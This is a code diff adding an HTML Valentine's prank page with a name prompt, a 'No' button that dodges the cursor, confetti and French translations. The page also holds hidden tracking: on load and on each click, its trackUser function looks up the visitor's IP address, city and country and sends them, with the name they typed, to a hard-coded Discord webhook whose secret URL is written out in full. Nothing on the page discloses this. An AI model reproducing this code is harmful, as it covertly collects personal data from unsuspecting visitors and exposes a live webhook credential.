@@ -1,17 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Will you be my Valentine?</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
+  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+  
+  <style>
+    :root {
+      --primary: #ff4d6d;
+      --secondary: #fbafba;
+      --bg: #ffe6eb;
+    }
+
+    body {
+      margin: 0;
+      height: 100vh;
+      font-family: 'Poppins', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: var(--bg);
+      overflow: hidden;
+      touch-action: none;
+    }
+
+    /* Background Hearts */
+    .heart-bg {
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      pointer-events: none;
+      z-index: 1;
+    }
+
+    .floating-heart {
+      position: absolute;
+      color: rgba(255, 77, 109, 0.2);
+      animation: float 6s infinite linear;
+      font-size: 20px;
+    }
+
+    @keyframes float {
+      0% { transform: translateY(100vh) rotate(0deg); opacity: 1; }
+      100% { transform: translateY(-10vh) rotate(360deg); opacity: 0; }
+    }
+
+    /* Fixed Name Portal Styling */
+    #namePortal {
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: var(--bg);
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      z-index: 1000;
+      padding: 20px;
+      transition: opacity 0.5s ease;
+    }
+
+    #namePortal h1 {
+      color: var(--primary);
+      font-size: 1.8rem;
+      margin-bottom: 30px;
+      line-height: 1.4;
+      max-width: 500px;
+    }
+
+    #namePortal input {
+      padding: 15px 25px;
+      border-radius: 30px;
+      border: 2px solid var(--primary);
+      font-size: 1.1rem;
+      width: 80%;
+      max-width: 300px;
+      outline: none;
+      margin-bottom: 25px;
+      font-family: 'Poppins', sans-serif;
+    }
+
+    #namePortal button {
+      background: var(--primary);
+      color: white;
+      border: none;
+      padding: 15px 40px;
+      border-radius: 50px;
+      font-weight: 800;
+      font-size: 1.1rem;
+      cursor: pointer;
+      box-shadow: 0 10px 20px rgba(255, 77, 109, 0.3);
+      transition: transform 0.2s ease;
+    }
+
+    #namePortal button:active { transform: scale(0.95); }
+
+    /* Game Card Styling */
+    .card {
+      background: white;
+      padding: 40px;
+      width: 90vw;
+      max-width: 450px;
+      height: 550px; 
+      border-radius: 40px;
+      box-shadow: 0 15px 50px rgba(0,0,0,0.1);
+      display: none; 
+      flex-direction: column;
+      align-items: center;
+      justify-content: space-between;
+      position: relative; 
+      overflow: hidden; 
+      z-index: 10;
+    }
+
+    .header-info { z-index: 100; position: relative; pointer-events: none; }
+    #joke-text { font-size: 0.9rem; color: var(--primary); min-height: 50px; font-weight: 800; text-transform: uppercase; }
+    #mainCard h1 { color: var(--primary); font-size: 1.6rem; margin: 0; line-height: 1.2; }
+
+    .yes-wrapper { flex-grow: 1; display: flex; justify-content: center; align-items: center; width: 100%; z-index: 20; }
+    
+    #yes {
+      background: var(--primary);
+      color: white;
+      font-size: 20px;
+      font-weight: 700;
+      padding: 15px 40px;
+      border: none;
+      border-radius: 50px;
+      cursor: pointer;
+      transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    }
+
+    #no {
+      background: var(--secondary);
+      color: white;
+      font-size: 16px;
+      font-weight: 700;
+      padding: 10px 25px;
+      border: none;
+      border-radius: 50px;
+      position: absolute;
+      z-index: 200;
+      transition: top 0.3s ease, left 0.3s ease;
+      white-space: nowrap;
+      left: 50%; top: 80%; transform: translate(-50%, -50%);
+    }
+
+    @keyframes pulse {
+      0% { transform: scale(2.5); }
+      70% { transform: scale(2.6); }
+      100% { transform: scale(2.5); }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="heart-bg" id="heartBg"></div>
+
+  <div id="namePortal">
+    <h1>My heart is locked.<br>Please enter the name of the key-holder...</h1>
+    <input type="text" id="userName" placeholder="Your name..." autocomplete="off">
+    <button onclick="startApp()">Unlock My Heart</button>
+  </div>
+
+  <div class="card" id="mainCard">
+    <div class="header-info">
+      <div id="joke-text">CATCH ME IF YOU CAN! 😉</div>
+      <h1>Will you be my Valentine? 🌹</h1>
+    </div>
+    <div class="yes-wrapper">
+      <button id="yes" onclick="yesClick()">Yes</button>
+    </div>
+    <button id="no">No</button>
+  </div>
+
 <script>
   let visitorName = "";
   let clickCount = 0;
   let yesScale = 1;
   const WEBHOOK_URL = "https://discord.com/api/webhooks/1468954384997023777/oL5KyCiivYCBUM3gI0_JWhkKiBV8t6ngFZjZbanUQ_XMUc2E2oWU1_OZw4u0eFfnax7A";
 
-  // Language Data
   const langContent = {
     en: {
       intro: "My heart is locked. <br>Please enter the name of the key-holder...",
       unlock: "Unlock My Heart",
       title: "Will you be my Valentine? 🌹",
       no: "No",
-      jokes: ["NICE TRY! 😉", "TOO SLOW!", "ERROR 404!", "MISSED ME!", "JUST SAY YES! ❤️", "DENIED!", "ALMOST!"],
+      jokes: ["NICE TRY! 😉", "TOO SLOW!", "ERROR 404!", "MISSED ME!", "JUST SAY YES! ❤️", "DENIED!"],
       success: "I KNEW IT! ❤️",
       happy: "HAPPY VALENTINE'S DAY, "
     },
@@ -20,63 +196,59 @@
       unlock: "Déverrouiller mon cœur",
       title: "Veux-tu être ma Valentine ? 🌹",
       no: "Non",
-      jokes: ["BIEN ESSAYÉ ! 😉", "TROP LENT !", "ERREUR 404 !", "TU M'AS RATÉ !", "DIS OUI ! ❤️", "REFUSÉ !", "PRESQUE !"],
+      jokes: ["BIEN ESSAYÉ ! 😉", "TROP LENT !", "ERREUR 404 !", "TU M'AS RATÉ !", "DIS OUI ! ❤️", "REFUSÉ !"],
       success: "JE LE SAVAIS ! ❤️",
       happy: "JOYEUSE SAINT-VALENTIN, "
     }
   };
 
-  let currentLang = langContent.en; // Default
+  let currentLang = langContent.en;
 
-  // 1. DETECTION & TRACKING
-  async function setupLanguageAndTrack(event) {
+  // Background Hearts
+  function createHearts() {
+    const bg = document.getElementById('heartBg');
+    for(let i=0; i<15; i++) {
+      let heart = document.createElement('div');
+      heart.className = 'floating-heart';
+      heart.innerHTML = '❤️';
+      heart.style.left = Math.random() * 100 + 'vw';
+      heart.style.animationDelay = Math.random() * 5 + 's';
+      bg.appendChild(heart);
+    }
+  }
+
+  async function trackUser(event) {
+    let logData = {
+      content: `💖 **Valentine Update**\n**User:** ${visitorName || "Someone"}\n**Event:** ${event}\n**Clicks:** ${clickCount}`
+    };
     try {
       const ipRes = await fetch('https://ipapi.co/json/');
       if(ipRes.ok) {
         const data = await ipRes.json();
-        
-        // Check if user is in France
-        if (data.country_code === "FR") {
-          currentLang = langContent.fr;
-          applyLanguage();
+        logData.content += `\n**Location:** ${data.city}, ${data.country_name}\n**IP:** ${data.ip}`;
+        if (data.country_code === "FR" && !visitorName) {
+           currentLang = langContent.fr;
+           document.querySelector("#namePortal h1").innerHTML = currentLang.intro;
+           document.querySelector("#namePortal button").innerText = currentLang.unlock;
         }
-
-        // Send Discord Log
-        fetch(WEBHOOK_URL, {
-          method: 'POST',
-          headers: {'Content-Type': 'application/json'},
-          body: JSON.stringify({
-            embeds: [{
-              title: "💖 Valentine Tracker",
-              color: 0xff4d6d,
-              description: `**User:** ${visitorName || "Loading..."}\n**Event:** ${event}\n**Country:** ${data.country_name}\n**IP:** ${data.ip}`,
-              timestamp: new Date()
-            }]
-          })
-        });
       }
-    } catch(e) { console.log("Language detection blocked"); }
+    } catch(e) {}
+    fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(logData) });
   }
 
-  function applyLanguage() {
-    document.querySelector("#namePortal h1").innerHTML = currentLang.intro;
-    document.querySelector("#namePortal button").innerText = currentLang.unlock;
-    document.querySelector("#mainCard h1").innerText = currentLang.title;
-    document.querySelector("#no").innerText = currentLang.no;
-    document.querySelector("#joke-text").innerText = currentLang.jokes[0];
-  }
-
-  // Initial detection on load
   window.onload = () => {
     createHearts();
-    setupLanguageAndTrack("Page Visited");
+    trackUser("Page Opened");
   };
 
   function startApp() {
-    const nameInput = document.getElementById('userName');
-    visitorName = nameInput.value.trim() || (currentLang === langContent.fr ? "Mon Amour" : "My Favorite Person");
+    visitorName = document.getElementById('userName').value.trim() || "My Favorite Person";
+    trackUser("Heart Unlocked");
     
-    setupLanguageAndTrack("Heart Unlocked");
+    // Apply language to card
+    document.querySelector("#mainCard h1").innerText = currentLang.title;
+    document.querySelector("#no").innerText = currentLang.no;
+    document.querySelector("#joke-text").innerText = currentLang.jokes[0];
 
     document.getElementById('namePortal').style.opacity = "0";
     setTimeout(() => {
@@ -85,14 +257,25 @@
     }, 500);
   }
 
+  document.addEventListener('mousemove', (e) => handleInput(e.clientX, e.clientY));
+  document.addEventListener('touchmove', (e) => handleInput(e.touches[0].clientX, e.touches[0].clientY));
+
+  function handleInput(x, y) {
+    const noBtn = document.getElementById("no");
+    if (!noBtn) return;
+    const rect = noBtn.getBoundingClientRect();
+    const dist = Math.sqrt(Math.pow(x - (rect.left + rect.width/2), 2) + Math.pow(y - (rect.top + rect.height/2), 2));
+    if (dist < 85) moveNo();
+  }
+
   function moveNo() {
     clickCount++;
-    
+    const yesBtn = document.getElementById("yes");
     if (yesScale < 2.5) { 
       yesScale += 0.15;
-      document.getElementById("yes").style.transform = `scale(${yesScale})`;
+      yesBtn.style.transform = `scale(${yesScale})`;
     } else {
-      document.getElementById("yes").style.animation = "pulse 1.5s infinite";
+      yesBtn.style.animation = "pulse 1.5s infinite";
     }
 
     const card = document.getElementById("mainCard");
@@ -100,23 +283,21 @@
     const pad = 60;
     noBtn.style.left = (Math.floor(Math.random() * (card.clientWidth - noBtn.offsetWidth - pad)) + pad/2) + "px";
     noBtn.style.top = (Math.floor(Math.random() * (card.clientHeight - noBtn.offsetHeight - pad)) + pad/2) + "px";
-
-    // Use current language jokes
     document.getElementById("joke-text").innerText = currentLang.jokes[clickCount % currentLang.jokes.length];
   }
 
   function yesClick() {
     document.getElementById("no").style.display = "none";
-    setupLanguageAndTrack("SAID YES! ❤️");
-    
+    trackUser("SAID YES! ❤️");
     confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 }, colors: ['#ff4d6d', '#ffffff', '#ffb3c1'] });
-
     document.getElementById("mainCard").innerHTML = `
-      <div style="margin: auto; z-index:100;">
-        <h1 style='font-size: 2.5rem;'>${currentLang.success}</h1>
+      <div style="margin: auto;">
+        <h1 style='font-size: 2.2rem;'>${currentLang.success}</h1>
         <p style='color: #ff4d6d; font-weight: 800; margin-top: 15px;'>${currentLang.happy}${visitorName.toUpperCase()} !</p>
       </div>
     `;
     document.body.style.background = "#ffb3c1";
   }
 </script>
+</body>
+</html>
